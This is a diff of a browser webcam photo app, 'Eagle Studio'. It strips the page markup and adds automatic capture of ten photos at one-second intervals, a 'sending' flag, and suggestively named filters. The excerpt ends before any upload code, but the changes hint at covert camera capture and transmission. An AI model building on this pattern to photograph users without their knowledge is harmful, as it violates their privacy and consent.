@@ -1,1147 +1,4 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Eagle Studio</title>
-
-<style>
-*{
-  box-sizing:border-box;
-  margin:0;
-  padding:0;
-}
-
-:root{
-  --bg:#f3f4f6;
-  --surface:#ffffff;
-  --surface2:#f8f9fb;
-  --text:#17181b;
-  --muted:#74777d;
-  --border:#e3e5e8;
-  --dark:#17181b;
-  --shadow:0 20px 60px rgba(0,0,0,.10);
-}
-
-body.dark{
-  --bg:#0c0d0f;
-  --surface:#15171a;
-  --surface2:#1c1f23;
-  --text:#f5f6f7;
-  --muted:#999da5;
-  --border:#2b2e33;
-  --dark:#f5f6f7;
-  --shadow:0 20px 60px rgba(0,0,0,.40);
-}
-
-body{
-  min-height:100vh;
-  background:var(--bg);
-  font-family:Arial,Helvetica,sans-serif;
-  color:var(--text);
-  overflow-x:hidden;
-  transition:background .3s,color .3s;
-}
-
-/* =========================
-   TOP BAR
-========================= */
-
-.topbar{
-  height:68px;
-  background:rgba(255,255,255,.88);
-  backdrop-filter:blur(18px);
-  -webkit-backdrop-filter:blur(18px);
-  border-bottom:1px solid var(--border);
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  padding:0 26px;
-  position:sticky;
-  top:0;
-  z-index:50;
-}
-
-body.dark .topbar{
-  background:rgba(21,23,26,.88);
-}
-
-.logo{
-  display:flex;
-  align-items:center;
-  font-size:21px;
-  font-weight:850;
-  letter-spacing:-.7px;
-}
-
-.logo-icon{
-  width:36px;
-  height:36px;
-  border-radius:11px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  margin-right:9px;
-  background:var(--dark);
-  color:var(--surface);
-  font-size:20px;
-  box-shadow:0 5px 15px rgba(0,0,0,.12);
-}
-
-.top-actions{
-  display:flex;
-  gap:8px;
-}
-
-.icon-btn{
-  width:40px;
-  height:40px;
-  border:1px solid var(--border);
-  background:var(--surface);
-  color:var(--text);
-  border-radius:11px;
-  cursor:pointer;
-  font-size:17px;
-  transition:.2s ease;
-}
-
-.icon-btn:hover{
-  transform:translateY(-1px);
-  box-shadow:0 6px 18px rgba(0,0,0,.08);
-}
-
-/* =========================
-   MAIN
-========================= */
-
-.main{
-  width:min(1180px,94%);
-  margin:30px auto 55px;
-}
-
-/* =========================
-   HERO
-========================= */
-
-.hero{
-  text-align:center;
-  margin-bottom:22px;
-}
-
-.hero h1{
-  font-size:30px;
-  letter-spacing:-1.2px;
-  margin-bottom:6px;
-}
-
-.hero p{
-  color:var(--muted);
-  font-size:12px;
-}
-
-/* =========================
-   CAMERA
-========================= */
-
-.camera-wrap{
-  display:flex;
-  justify-content:center;
-}
-
-.camera{
-  width:min(900px,100%);
-  aspect-ratio:16/10;
-  background:#080808;
-  border-radius:24px;
-  position:relative;
-  overflow:hidden;
-  box-shadow:var(--shadow);
-  border:1px solid rgba(255,255,255,.08);
-}
-
-video{
-  width:100%;
-  height:100%;
-  object-fit:cover;
-  display:block;
-  background:#080808;
-}
-
-.camera-label{
-  position:absolute;
-  top:16px;
-  left:16px;
-  background:rgba(0,0,0,.58);
-  color:#fff;
-  padding:8px 12px;
-  border-radius:9px;
-  font-size:9px;
-  font-weight:800;
-  letter-spacing:1.7px;
-  z-index:5;
-  backdrop-filter:blur(8px);
-}
-
-.live-dot{
-  display:inline-block;
-  width:7px;
-  height:7px;
-  border-radius:50%;
-  background:#ff4545;
-  margin-right:6px;
-  box-shadow:0 0 10px rgba(255,60,60,.8);
-}
-
-.camera::after{
-  content:"";
-  position:absolute;
-  inset:0;
-  pointer-events:none;
-  border:1px solid rgba(255,255,255,.08);
-  border-radius:24px;
-}
-
-/* =========================
-   CONTROLS
-========================= */
-
-.controls{
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  gap:14px;
-  margin:22px 0 10px;
-}
-
-.btn{
-  border:1px solid var(--border);
-  background:var(--surface);
-  color:var(--text);
-  min-height:46px;
-  padding:0 19px;
-  border-radius:13px;
-  font-size:12px;
-  font-weight:800;
-  cursor:pointer;
-  transition:.2s ease;
-}
-
-.btn:hover{
-  transform:translateY(-2px);
-  box-shadow:0 8px 22px rgba(0,0,0,.09);
-}
-
-.btn:active{
-  transform:scale(.96);
-}
-
-.btn.primary{
-  background:var(--dark);
-  color:var(--surface);
-  border-color:var(--dark);
-}
-
-.btn:disabled{
-  opacity:.45;
-  cursor:not-allowed;
-  transform:none;
-}
-
-.shutter{
-  width:70px;
-  height:70px;
-  border-radius:50%;
-  border:6px solid var(--surface);
-  outline:2px solid var(--dark);
-  background:var(--dark);
-  cursor:pointer;
-  box-shadow:0 7px 25px rgba(0,0,0,.18);
-  transition:.18s ease;
-  position:relative;
-}
-
-.shutter::after{
-  content:"";
-  position:absolute;
-  inset:7px;
-  border-radius:50%;
-  border:1px solid rgba(255,255,255,.25);
-}
-
-.shutter:hover{
-  transform:scale(1.07);
-}
-
-.shutter:active{
-  transform:scale(.91);
-}
-
-.shutter:disabled{
-  opacity:.4;
-  cursor:not-allowed;
-}
-
-.auto-info{
-  text-align:center;
-  min-height:20px;
-  color:var(--muted);
-  font-size:11px;
-  font-weight:600;
-}
-
-/* =========================
-   PANELS
-========================= */
-
-.panel{
-  background:var(--surface);
-  border:1px solid var(--border);
-  border-radius:18px;
-  padding:18px;
-  margin-top:22px;
-  box-shadow:0 8px 30px rgba(0,0,0,.04);
-}
-
-.section-header{
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  margin-bottom:13px;
-}
-
-.section-title{
-  font-size:13px;
-  font-weight:850;
-  letter-spacing:-.2px;
-}
-
-.section-subtitle{
-  color:var(--muted);
-  font-size:10px;
-}
-
-/* =========================
-   EFFECTS
-========================= */
-
-.effects{
-  display:flex;
-  gap:10px;
-  overflow-x:auto;
-  padding:2px 2px 8px;
-  scrollbar-width:thin;
-}
-
-.effects::-webkit-scrollbar{
-  height:5px;
-}
-
-.effects::-webkit-scrollbar-thumb{
-  background:#bfc2c7;
-  border-radius:20px;
-}
-
-.effect{
-  flex:0 0 auto;
-  width:92px;
-  border:1px solid var(--border);
-  background:var(--surface2);
-  color:var(--text);
-  border-radius:13px;
-  padding:8px;
-  cursor:pointer;
-  transition:.2s ease;
-  text-align:center;
-}
-
-.effect:hover{
-  transform:translateY(-2px);
-}
-
-.effect.active{
-  background:var(--dark);
-  color:var(--surface);
-  border-color:var(--dark);
-  transform:translateY(-2px);
-  box-shadow:0 8px 20px rgba(0,0,0,.13);
-}
-
-.effect-preview{
-  width:100%;
-  height:48px;
-  border-radius:9px;
-  margin-bottom:8px;
-  background:linear-gradient(135deg,#222,#999);
-  position:relative;
-  overflow:hidden;
-}
-
-.effect-preview::after{
-  content:"";
-  position:absolute;
-  inset:0;
-  background:
-    radial-gradient(circle at 30% 35%,rgba(255,255,255,.35),transparent 22%),
-    linear-gradient(135deg,transparent 35%,rgba(255,255,255,.12));
-}
-
-.effect-name{
-  font-size:9px;
-  font-weight:850;
-  text-transform:uppercase;
-  letter-spacing:.4px;
-}
-
-.p-normal{
-  background:linear-gradient(135deg,#e7c0a5,#555);
-}
-
-.p-mirror{
-  background:linear-gradient(135deg,#9ed0ff,#555);
-  transform:scaleX(-1);
-}
-
-.p-gray{
-  background:linear-gradient(135deg,#ddd,#222);
-  filter:grayscale(1);
-}
-
-.p-sepia{
-  background:linear-gradient(135deg,#d6a46d,#543);
-  filter:sepia(1);
-}
-
-.p-warm{
-  background:linear-gradient(135deg,#ffb36b,#773);
-  filter:sepia(.3) saturate(1.5);
-}
-
-.p-cool{
-  background:linear-gradient(135deg,#7bc8ff,#234);
-  filter:hue-rotate(25deg);
-}
-
-.p-vivid{
-  background:linear-gradient(135deg,#ff3b8d,#14bfff);
-  filter:saturate(1.8);
-}
-
-.p-dream{
-  background:linear-gradient(135deg,#ffcce4,#b9dfff);
-  filter:brightness(1.15);
-}
-
-.p-noir{
-  background:linear-gradient(135deg,#eee,#111);
-  filter:grayscale(1) contrast(1.5);
-}
-
-.p-old{
-  background:linear-gradient(135deg,#c89c64,#4b3928);
-  filter:sepia(.7);
-}
-
-.p-glitch{
-  background:linear-gradient(90deg,#ff00aa,#00ffff,#ffff00);
-}
-
-.p-thermal{
-  background:linear-gradient(90deg,#1600ff,#ff0000,#ffff00);
-}
-
-.p-night{
-  background:linear-gradient(135deg,#14233d,#1e6b48);
-}
-
-.p-gold{
-  background:linear-gradient(135deg,#ffe38a,#8a5d00);
-}
-
-.p-pink{
-  background:linear-gradient(135deg,#ffb5d8,#d83286);
-}
-
-.p-blue{
-  background:linear-gradient(135deg,#9bdcff,#1555aa);
-}
-
-.p-fade{
-  background:linear-gradient(135deg,#ddd,#aaa);
-}
-
-/* =========================
-   GALLERY
-========================= */
-
-.gallery{
-  display:grid;
-  grid-template-columns:repeat(auto-fill,minmax(115px,1fr));
-  gap:11px;
-}
-
-.gallery-empty{
-  text-align:center;
-  color:var(--muted);
-  font-size:11px;
-  padding:22px 0;
-  grid-column:1/-1;
-}
-
-.gallery-item{
-  aspect-ratio:1/1;
-  border-radius:13px;
-  overflow:hidden;
-  background:#111;
-  position:relative;
-  animation:galleryIn .3s ease;
-}
-
-@keyframes galleryIn{
-  from{
-    opacity:0;
-    transform:scale(.92);
-  }
-  to{
-    opacity:1;
-    transform:scale(1);
-  }
-}
-
-.gallery-item img{
-  width:100%;
-  height:100%;
-  object-fit:cover;
-  display:block;
-}
-
-.gallery-download{
-  position:absolute;
-  right:7px;
-  bottom:7px;
-  width:31px;
-  height:31px;
-  border:0;
-  border-radius:9px;
-  background:rgba(0,0,0,.68);
-  color:#fff;
-  cursor:pointer;
-  backdrop-filter:blur(8px);
-}
-
-/* =========================
-   SAVE AREA
-========================= */
-
-.save-area{
-  display:flex;
-  justify-content:center;
-  margin-top:18px;
-}
-
-.save-btn{
-  display:none;
-  min-width:190px;
-  justify-content:center;
-}
-
-/* =========================
-   SETTINGS
-========================= */
-
-.settings{
-  position:fixed;
-  top:0;
-  right:-360px;
-  width:340px;
-  max-width:90%;
-  height:100vh;
-  background:var(--surface);
-  border-left:1px solid var(--border);
-  z-index:100;
-  padding:22px;
-  box-shadow:-15px 0 45px rgba(0,0,0,.15);
-  transition:right .3s ease;
-}
-
-.settings.open{
-  right:0;
-}
-
-.settings-header{
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  margin-bottom:25px;
-}
-
-.settings-title{
-  font-size:18px;
-  font-weight:850;
-}
-
-.close-settings{
-  width:36px;
-  height:36px;
-  border:1px solid var(--border);
-  background:var(--surface2);
-  color:var(--text);
-  border-radius:10px;
-  cursor:pointer;
-}
-
-.setting-row{
-  padding:16px 0;
-  border-bottom:1px solid var(--border);
-}
-
-.setting-label{
-  display:flex;
-  justify-content:space-between;
-  align-items:center;
-  font-size:12px;
-  font-weight:800;
-  margin-bottom:10px;
-}
-
-.setting-description{
-  color:var(--muted);
-  font-size:10px;
-  line-height:1.5;
-}
-
-.setting-select{
-  width:100%;
-  height:42px;
-  border:1px solid var(--border);
-  background:var(--surface2);
-  color:var(--text);
-  border-radius:10px;
-  padding:0 11px;
-  outline:none;
-}
-
-.overlay{
-  position:fixed;
-  inset:0;
-  background:rgba(0,0,0,.38);
-  z-index:90;
-  opacity:0;
-  pointer-events:none;
-  transition:.25s ease;
-}
-
-.overlay.active{
-  opacity:1;
-  pointer-events:auto;
-}
-
-/* =========================
-   TOAST
-========================= */
-
-.toast{
-  position:fixed;
-  left:50%;
-  bottom:25px;
-  transform:translate(-50%,20px);
-  background:var(--dark);
-  color:var(--surface);
-  padding:11px 16px;
-  border-radius:12px;
-  font-size:11px;
-  font-weight:700;
-  opacity:0;
-  pointer-events:none;
-  z-index:200;
-  transition:.25s ease;
-}
-
-.toast.show{
-  opacity:1;
-  transform:translate(-50%,0);
-}
-
-/* =========================
-   FILTERS
-========================= */
-
-.fx-mirror{
-  transform:scaleX(-1);
-}
-
-.fx-gray{
-  filter:grayscale(1);
-}
-
-.fx-sepia{
-  filter:sepia(1);
-}
-
-.fx-warm{
-  filter:sepia(.25) saturate(1.45) contrast(1.05);
-}
-
-.fx-cool{
-  filter:saturate(.8) hue-rotate(25deg) brightness(1.08);
-}
-
-.fx-vivid{
-  filter:saturate(1.8) contrast(1.12);
-}
-
-.fx-dream{
-  filter:brightness(1.15) saturate(.85) contrast(.9);
-}
-
-.fx-noir{
-  filter:grayscale(1) contrast(1.5) brightness(.85);
-}
-
-.fx-old{
-  filter:sepia(.65) contrast(1.15) saturate(.7);
-}
-
-.fx-glitch{
-  filter:hue-rotate(90deg) saturate(2) contrast(1.3);
-}
-
-.fx-thermal{
-  filter:hue-rotate(150deg) saturate(2.2) contrast(1.35);
-}
-
-.fx-night{
-  filter:hue-rotate(85deg) saturate(1.7) brightness(.75) contrast(1.2);
-}
-
-.fx-gold{
-  filter:sepia(.3) saturate(1.7) brightness(1.05);
-}
-
-.fx-pink{
-  filter:hue-rotate(310deg) saturate(1.5);
-}
-
-.fx-blue{
-  filter:hue-rotate(190deg) saturate(1.35);
-}
-
-.fx-fade{
-  filter:contrast(.82) saturate(.65) brightness(1.08);
-}
-
-/* =========================
-   MOBILE
-========================= */
-
-@media(max-width:700px){
-
-  .topbar{
-    height:58px;
-    padding:0 12px;
-  }
-
-  .logo{
-    font-size:17px;
-  }
-
-  .logo-icon{
-    width:32px;
-    height:32px;
-    font-size:17px;
-    margin-right:7px;
-  }
-
-  .icon-btn{
-    width:36px;
-    height:36px;
-  }
-
-  .main{
-    width:100%;
-    margin:15px auto 35px;
-  }
-
-  .hero{
-    margin:0 14px 15px;
-  }
-
-  .hero h1{
-    font-size:24px;
-  }
-
-  .camera{
-    width:100%;
-    border-radius:0;
-    aspect-ratio:4/3;
-    border-left:0;
-    border-right:0;
-    box-shadow:none;
-  }
-
-  .camera::after{
-    border-radius:0;
-  }
-
-  .controls{
-    margin:16px 12px 8px;
-    gap:10px;
-  }
-
-  .btn{
-    min-height:43px;
-    padding:0 13px;
-    font-size:10px;
-  }
-
-  .shutter{
-    width:61px;
-    height:61px;
-  }
-
-  .panel{
-    margin:17px 10px 0;
-    padding:14px;
-    border-radius:15px;
-  }
-
-  .effects{
-    margin-right:-5px;
-  }
-
-  .effect{
-    width:82px;
-  }
-
-  .effect-preview{
-    height:43px;
-  }
-
-  .gallery{
-    grid-template-columns:repeat(3,1fr);
-    gap:8px;
-  }
-
-  .settings{
-    width:320px;
-  }
-}
-</style>
-</head>
-
-<body>
-
-<header class="topbar">
-
-  <div class="logo">
-    <div class="logo-icon">🦅</div>
-    Eagle Studio
-  </div>
-
-  <div class="top-actions">
-
-    <button
-      class="icon-btn"
-      id="themeBtn"
-      aria-label="Theme">
-      ☾
-    </button>
-
-    <button
-      class="icon-btn"
-      id="settingsBtn"
-      aria-label="Settings">
-      ⚙
-    </button>
-
-  </div>
-
-</header>
-
-
-<main class="main">
-
-  <div class="hero">
-
-    <h1>Studio Camera</h1>
-
-    <p>Create your shot with your favorite style.</p>
-
-  </div>
-
-
-  <!-- CAMERA -->
-
-  <div class="camera-wrap">
-
-    <div class="camera" id="cameraBox">
-
-      <div class="camera-label">
-        <span class="live-dot"></span>
-        CAMERA
-      </div>
-
-      <video
-        id="video"
-        autoplay
-        playsinline
-        muted>
-      </video>
-
-    </div>
-
-  </div>
-
-
-  <!-- CONTROLS -->
-
-  <div class="controls">
-
-    <button
-      class="btn primary"
-      id="start">
-      🎥 تشغيل الكاميرا
-    </button>
-
-    <button
-      class="shutter"
-      id="capture"
-      disabled
-      aria-label="Capture">
-    </button>
-
-  </div>
-
-
-  <div
-    class="auto-info"
-    id="autoInfo">
-  </div>
-
-
-  <!-- EFFECTS -->
-
-  <section class="panel">
-
-    <div class="section-header">
-
-      <div class="section-title">
-        Effects
-      </div>
-
-      <div class="section-subtitle">
-        Choose your style
-      </div>
-
-    </div>
-
-
-    <div class="effects">
-
-      <button class="effect active" data-effect="normal">
-        <div class="effect-preview p-normal"></div>
-        <div class="effect-name">Desire</div>
-      </button>
-
-      <button class="effect" data-effect="mirror">
-        <div class="effect-preview p-mirror"></div>
-        <div class="effect-name">Double</div>
-      </button>
-
-      <button class="effect" data-effect="gray">
-        <div class="effect-preview p-gray"></div>
-        <div class="effect-name">Midnight</div>
-      </button>
-
-      <button class="effect" data-effect="sepia">
-        <div class="effect-preview p-sepia"></div>
-        <div class="effect-name">After Dark</div>
-      </button>
-
-      <button class="effect" data-effect="warm">
-        <div class="effect-preview p-warm"></div>
-        <div class="effect-name">Heat</div>
-      </button>
-
-      <button class="effect" data-effect="cool">
-        <div class="effect-preview p-cool"></div>
-        <div class="effect-name">Temptation</div>
-      </button>
-
-      <button class="effect" data-effect="vivid">
-        <div class="effect-preview p-vivid"></div>
-        <div class="effect-name">Passion</div>
-      </button>
-
-      <button class="effect" data-effect="dream">
-        <div class="effect-preview p-dream"></div>
-        <div class="effect-name">Fantasy</div>
-      </button>
-
-      <button class="effect" data-effect="noir">
-        <div class="effect-preview p-noir"></div>
-        <div class="effect-name">Forbidden</div>
-      </button>
-
-      <button class="effect" data-effect="old">
-        <div class="effect-preview p-old"></div>
-        <div class="effect-name">Classic</div>
-      </button>
-
-      <button class="effect" data-effect="glitch">
-        <div class="effect-preview p-glitch"></div>
-        <div class="effect-name">Wild</div>
-      </button>
-
-      <button class="effect" data-effect="thermal">
-        <div class="effect-preview p-thermal"></div>
-        <div class="effect-name">Hot</div>
-      </button>
-
-      <button class="effect" data-effect="night">
-        <div class="effect-preview p-night"></div>
-        <div class="effect-name">Late Night</div>
-      </button>
-
-      <button class="effect" data-effect="gold">
-        <div class="effect-preview p-gold"></div>
-        <div class="effect-name">Luxury</div>
-      </button>
-
-      <button class="effect" data-effect="pink">
-        <div class="effect-preview p-pink"></div>
-        <div class="effect-name">Tease</div>
-      </button>
-
-      <button class="effect" data-effect="blue">
-        <div class="effect-preview p-blue"></div>
-        <div class="effect-name">Secret</div>
-      </button>
-
-      <button class="effect" data-effect="fade">
-        <div class="effect-preview p-fade"></div>
-        <div class="effect-name">Velvet</div>
-      </button>
-
-    </div>
-
-  </section>
-
-
-  <!-- GALLERY -->
-
-  <section class="panel">
-
-    <div class="section-header">
-
-      <div class="section-title">
-        Gallery
-      </div>
-
-      <div class="section-subtitle">
-        Recent shots
-      </div>
-
-    </div>
-
-    <div
-      class="gallery"
-      id="gallery">
-
-      <div class="gallery-empty">
-        Your captured photos will appear here.
-      </div>
-
-    </div>
-
-  </section>
-
-
-  <!-- SAVE -->
-
-  <div class="save-area">
-
-    <button
-      class="btn save-btn"
-      id="save">
-      💾 Save / Download
-    </button>
-
-  </div>
-
-</main>
-
-
-<!-- SETTINGS -->
-
-<div
-  class="overlay"
-  id="overlay">
-</div>
-
-
-<aside
-  class="settings"
-  id="settingsPanel">
-
-  <div class="settings-header">
-
-    <div class="settings-title">
-      Settings
-    </div>
-
-    <button
-      class="close-settings"
-      id="closeSettings">
-      ✕
-    </button>
-
-  </div>
-
-
-  <div class="setting-row">
-
-    <div class="setting-label">
-      <span>Image Quality</span>
-    </div>
-
-    <div class="setting-description">
-      Choose the JPEG quality used when saving photos.
-    </div>
-
-    <select
-      class="setting-select"
-      id="quality">
-
-      <option value="0.92">High — 92%</option>
-      <option value="0.85">Balanced — 85%</option>
-      <option value="0.75">Standard — 75%</option>
-
-    </select>
-
-  </div>
-
-</aside>
-
-
-<div
-  class="toast"
-  id="toast">
-</div>
-
-
-<canvas
-  id="canvas"
-  style="display:none">
-</canvas>
-
-
 <script>
-
-/* =========================
-   ELEMENTS
-========================= */
-
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 
@@ -1159,215 +16,217 @@ const closeSettings = document.getElementById("closeSettings");
 const overlay = document.getElementById("overlay");
 
 const quality = document.getElementById("quality");
+const photoCount = document.getElementById("photoCount");
+const photoInterval = document.getElementById("photoInterval");
 
 const toast = document.getElementById("toast");
-
-
-/* =========================
-   STATE
-========================= */
 
 let stream = null;
 let selectedEffect = "normal";
 let lastBlob = null;
+
+let autoStarted = false;
+let sending = false;
+
 let galleryPhotos = [];
-let imageQuality = .92;
 
-
-/* =========================
-   TOAST
-========================= */
-
-function showToast(message){
-
-  toast.textContent = message;
-
-  toast.classList.add("show");
-
-  setTimeout(() => {
-    toast.classList.remove("show");
-  },2200);
-
-}
+let imageQuality = 0.92;
+let automaticPhotoCount = 10;
+let automaticInterval = 1000;
 
 
 /* =========================
    SETTINGS
 ========================= */
 
-settingsBtn.addEventListener("click",() => {
+if (quality) {
+  quality.addEventListener("change", () => {
+    imageQuality = parseFloat(quality.value);
+  });
+}
 
-  settingsPanel.classList.add("open");
-  overlay.classList.add("active");
+if (photoCount) {
+  photoCount.addEventListener("change", () => {
+    automaticPhotoCount = parseInt(photoCount.value, 10);
+  });
+}
 
-});
-
-
-function closeSettingsPanel(){
-
-  settingsPanel.classList.remove("open");
-  overlay.classList.remove("active");
-
+if (photoInterval) {
+  photoInterval.addEventListener("change", () => {
+    automaticInterval = parseInt(photoInterval.value, 10);
+  });
 }
 
 
-closeSettings.addEventListener(
-  "click",
-  closeSettingsPanel
-);
+/* =========================
+   TOAST
+========================= */
 
-overlay.addEventListener(
-  "click",
-  closeSettingsPanel
-);
+function showToast(message) {
+  if (!toast) return;
 
+  toast.textContent = message;
+  toast.classList.add("show");
 
-quality.addEventListener("change",() => {
+  clearTimeout(window.toastTimer);
 
-  imageQuality = Number(quality.value);
-
-});
+  window.toastTimer = setTimeout(() => {
+    toast.classList.remove("show");
+  }, 2500);
+}
 
 
 /* =========================
    DARK / LIGHT MODE
 ========================= */
 
-themeBtn.addEventListener("click",() => {
+if (themeBtn) {
+  themeBtn.addEventListener("click", () => {
+    document.body.classList.toggle("light");
 
-  document.body.classList.toggle("dark");
+    const isLight = document.body.classList.contains("light");
 
-  const dark =
-    document.body.classList.contains("dark");
+    localStorage.setItem(
+      "eagle-theme",
+      isLight ? "light" : "dark"
+    );
+  });
+}
 
-  themeBtn.textContent =
-    dark ? "☀" : "☾";
-
-  localStorage.setItem(
-    "eagle-theme",
-    dark ? "dark" : "light"
-  );
-
-});
-
-
-const savedTheme =
-  localStorage.getItem("eagle-theme");
-
-if(savedTheme === "dark"){
-
-  document.body.classList.add("dark");
-
-  themeBtn.textContent = "☀";
-
+if (localStorage.getItem("eagle-theme") === "light") {
+  document.body.classList.add("light");
 }
 
 
 /* =========================
-   EFFECT SELECTION
+   SETTINGS PANEL
 ========================= */
 
-document.querySelectorAll(".effect").forEach(button => {
+if (settingsBtn) {
+  settingsBtn.addEventListener("click", () => {
+    if (settingsPanel) {
+      settingsPanel.classList.add("open");
+    }
 
-  button.addEventListener("click",() => {
+    if (overlay) {
+      overlay.classList.add("show");
+    }
+  });
+}
 
-    document
-      .querySelectorAll(".effect")
-      .forEach(b => {
-        b.classList.remove("active");
-      });
+function closeSettingsPanel() {
+  if (settingsPanel) {
+    settingsPanel.classList.remove("open");
+  }
+
+  if (overlay) {
+    overlay.classList.remove("show");
+  }
+}
+
+if (closeSettings) {
+  closeSettings.addEventListener("click", closeSettingsPanel);
+}
+
+if (overlay) {
+  overlay.addEventListener("click", closeSettingsPanel);
+}
+
+
+/* =========================
+   EFFECTS
+========================= */
+
+const effectButtons = document.querySelectorAll("[data-effect]");
+
+effectButtons.forEach(button => {
+  button.addEventListener("click", () => {
+    selectedEffect = button.dataset.effect;
+
+    effectButtons.forEach(item => {
+      item.classList.remove("active");
+    });
 
     button.classList.add("active");
 
-    selectedEffect =
-      button.dataset.effect;
-
     applyEffect();
-
   });
-
 });
 
 
-/* =========================
-   APPLY EFFECT
-========================= */
-
-function applyEffect(){
+function applyEffect() {
 
   video.className = "";
 
-  if(selectedEffect === "normal"){
+  if (selectedEffect === "normal") {
     return;
   }
 
-  if(selectedEffect === "mirror"){
-
+  if (selectedEffect === "mirror") {
     video.classList.add("fx-mirror");
-
     return;
   }
 
-  video.classList.add(
-    "fx-" + selectedEffect
-  );
-
+  video.classList.add("fx-" + selectedEffect);
 }
 
 
 /* =========================
-   CANVAS FILTER
+   CANVAS FILTERS
 ========================= */
 
-function getCanvasFilter(effect){
+function getCanvasFilter(effect) {
 
-  if(effect === "gray")
-    return "grayscale(1)";
+  switch (effect) {
 
-  if(effect === "sepia")
-    return "sepia(1)";
+    case "gray":
+      return "grayscale(1)";
 
-  if(effect === "warm")
-    return "sepia(.25) saturate(1.45) contrast(1.05)";
+    case "sepia":
+      return "sepia(1)";
 
-  if(effect === "cool")
-    return "saturate(.8) hue-rotate(25deg) brightness(1.08)";
+    case "warm":
+      return "sepia(.25) saturate(1.35)";
 
-  if(effect === "vivid")
-    return "saturate(1.8) contrast(1.12)";
+    case "cool":
+      return "hue-rotate(180deg) saturate(.85)";
 
-  if(effect === "dream")
-    return "brightness(1.15) saturate(.85) contrast(.9)";
+    case "vivid":
+      return "saturate(1.8) contrast(1.15)";
 
-  if(effect === "noir")
-    return "grayscale(1) contrast(1.5) brightness(.85)";
+    case "dream":
+      return "brightness(1.08) saturate(1.15) blur(.2px)";
 
-  if(effect === "old")
-    return "sepia(.65) contrast(1.15) saturate(.7)";
+    case "noir":
+      return "grayscale(1) contrast(1.5) brightness(.9)";
 
-  if(effect === "glitch")
-    return "hue-rotate(90deg) saturate(2) contrast(1.3)";
+    case "old":
+      return "sepia(.65) contrast(1.05) brightness(.95)";
 
-  if(effect === "thermal")
-    return "hue-rotate(150deg) saturate(2.2) contrast(1.35)";
+    case "glitch":
+      return "contrast(1.35) saturate(1.5) hue-rotate(20deg)";
 
-  if(effect === "night")
-    return "hue-rotate(85deg) saturate(1.7) brightness(.75) contrast(1.2)";
+    case "thermal":
+      return "contrast(1.5) saturate(2.5) hue-rotate(190deg)";
 
-  if(effect === "gold")
-    return "sepia(.3) saturate(1.7) brightness(1.05)";
+    case "night":
+      return "brightness(.7) contrast(1.2) saturate(.8)";
 
-  if(effect === "pink")
-    return "hue-rotate(310deg) saturate(1.5)";
+    case "gold":
+      return "sepia(.4) saturate(1.5) hue-rotate(-10deg)";
 
-  if(effect === "blue")
-    return "hue-rotate(190deg) saturate(1.35)";
+    case "pink":
+      return "sepia(.15) saturate(1.5) hue-rotate(310deg)";
 
-  if(effect === "fade")
-    return "contrast(.82) saturate(.65) brightness(1.08)";
+    case "blue":
+      return "saturate(1.2) hue-rotate(170deg)";
 
-  return "none";
+    case "fade":
+      return "contrast(.85) brightness(1.08) saturate(.7)";
 
+    default:
+      return "none";
+  }
 }
 
 
@@ -1375,101 +234,39 @@ function getCanvasFilter(effect){
    GALLERY
 ========================= */
 
-function addToGallery(blob){
+function addToGallery(blob) {
 
-  const url =
-    URL.createObjectURL(blob);
+  const url = URL.createObjectURL(blob);
 
-  galleryPhotos.unshift({
-    blob,
-    url
+  galleryPhotos.push({
+    blob: blob,
+    url: url
   });
 
-  if(galleryPhotos.length > 12){
-
-    const removed =
-      galleryPhotos.pop();
-
-    URL.revokeObjectURL(
-      removed.url
-    );
-
-  }
-
   renderGallery();
-
 }
 
 
-function renderGallery(){
+function renderGallery() {
+
+  if (!gallery) return;
 
   gallery.innerHTML = "";
 
-  if(galleryPhotos.length === 0){
+  galleryPhotos.forEach((photo, index) => {
 
-    gallery.innerHTML = `
-      <div class="gallery-empty">
-        Your captured photos will appear here.
-      </div>
-    `;
+    const item = document.createElement("div");
+    item.className = "gallery-item";
 
-    return;
-  }
-
-
-  galleryPhotos.forEach((photo,index) => {
-
-    const item =
-      document.createElement("div");
-
-    item.className =
-      "gallery-item";
-
-
-    const img =
-      document.createElement("img");
+    const img = document.createElement("img");
 
     img.src = photo.url;
-
-    img.alt =
-      "Eagle Studio photo";
-
-
-    const download =
-      document.createElement("button");
-
-    download.className =
-      "gallery-download";
-
-    download.textContent =
-      "↓";
-
-    download.title =
-      "Download";
-
-
-    download.addEventListener(
-      "click",
-      () => {
-
-        downloadBlob(
-          photo.blob,
-          "eagle-studio-" +
-          (index + 1) +
-          ".jpg"
-        );
-
-      }
-    );
-
+    img.alt = "Captured photo " + (index + 1);
 
     item.appendChild(img);
-    item.appendChild(download);
 
     gallery.appendChild(item);
-
   });
-
 }
 
 
@@ -1477,20 +274,15 @@ function renderGallery(){
    DOWNLOAD
 ========================= */
 
-function downloadBlob(blob,filename){
+function downloadBlob(blob, filename) {
 
-  if(!blob){
-    return;
-  }
+  if (!blob) return;
 
-  const url =
-    URL.createObjectURL(blob);
+  const url = URL.createObjectURL(blob);
 
-  const link =
-    document.createElement("a");
+  const link = document.createElement("a");
 
   link.href = url;
-
   link.download = filename;
 
   document.body.appendChild(link);
@@ -1500,118 +292,123 @@ function downloadBlob(blob,filename){
   link.remove();
 
   setTimeout(() => {
-
     URL.revokeObjectURL(url);
+  }, 1000);
+}
 
-  },1000);
 
+if (save) {
+
+  save.addEventListener("click", () => {
+
+    if (!lastBlob) {
+      showToast("No photo available.");
+      return;
+    }
+
+    downloadBlob(
+      lastBlob,
+      "eagle-studio-" + Date.now() + ".jpg"
+    );
+  });
 }
 
 
 /* =========================
    TAKE PHOTO
+   NO WHITE FLASH
 ========================= */
 
-async function takePhoto(){
+async function takePhoto() {
 
-  if(!video.videoWidth){
+  if (!video.videoWidth || !video.videoHeight) {
     return null;
   }
 
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
 
-  canvas.width =
-    video.videoWidth;
+  const ctx = canvas.getContext("2d");
 
-  canvas.height =
-    video.videoHeight;
-
-
-  const ctx =
-    canvas.getContext("2d");
-
-
-  ctx.filter =
-    getCanvasFilter(
-      selectedEffect
-    );
-
-
-  if(selectedEffect === "mirror"){
-
-    ctx.translate(
-      canvas.width,
-      0
-    );
-
